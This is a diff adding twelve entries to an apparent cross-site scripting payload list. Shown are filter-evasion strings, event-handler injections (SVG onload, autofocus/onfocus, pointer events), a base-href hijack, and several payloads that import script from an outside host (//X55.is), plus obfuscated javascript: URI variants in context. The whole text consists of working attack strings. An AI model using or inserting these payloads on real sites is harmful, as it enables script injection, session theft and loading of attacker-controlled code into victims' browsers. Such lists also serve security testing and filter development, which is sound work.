@@ -2768,3 +2768,15 @@ jaVasCript:/--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmo
 <img src=x onerror=\u0061\u006C\u0065\u0072\u0074(document.domain)>
 javascript:window/*Ata*/[%27loc%27%2b%27ati%27%2b%27on%27]%3d%27java%27%2b%27scr%27%2b%27ipt:%27%2blocation/*#*/;alert(origin)
 confirm?.(1)
+<Base Href=//X55.is>
+<Script Href=//X55.is>
+<K OnPointerRawUpdate=alert(1)>
+\'/alert(1)//
+JavaScript:alert(1)
+'-alert(1)-'
+<K ContentEditable AutoFocus OnFocus=alert(1)>
+"AutoFocus OnFocus=alert(1)//
+<Svg OnLoad=alert(1)>
+<Svg OnLoad=import('//X55.is')>
+'-import('//X55.is')-'
+<Img Src=//X55.is OnLoad=import(src)>
